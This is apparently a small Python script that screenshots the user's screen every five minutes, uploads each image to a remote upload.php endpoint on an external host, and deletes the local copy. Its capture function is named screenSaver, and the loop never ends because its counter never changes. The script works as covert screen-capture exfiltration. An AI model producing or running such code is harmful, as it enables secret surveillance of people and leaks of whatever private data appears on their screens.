import pyautogui
import random
import time
import os
import requests

num = 10
x = 1

def siteRequest():
    global n, path
    address = f"https://storage.esec.sk/screens/upload.php"
    files = {'fileToUpload': open(path,'rb')}
    r = requests.post(address, files=files).json()
    print(r["response"])
    if r["response"] == "success":
        pass
    elif r["response"] == "error":
        print(r["info"])

def screenSaver():
    global n, path
    n = random.sample(range(9999), 1)
    path = f"{os.environ['USERPROFILE']}/Pictures/{n}.png"
    screenShot = pyautogui.screenshot()
    screenShot.save(path)
    siteRequest()
    os.remove(path)

while x in range(num):
    screenSaver()
    time.sleep(300)
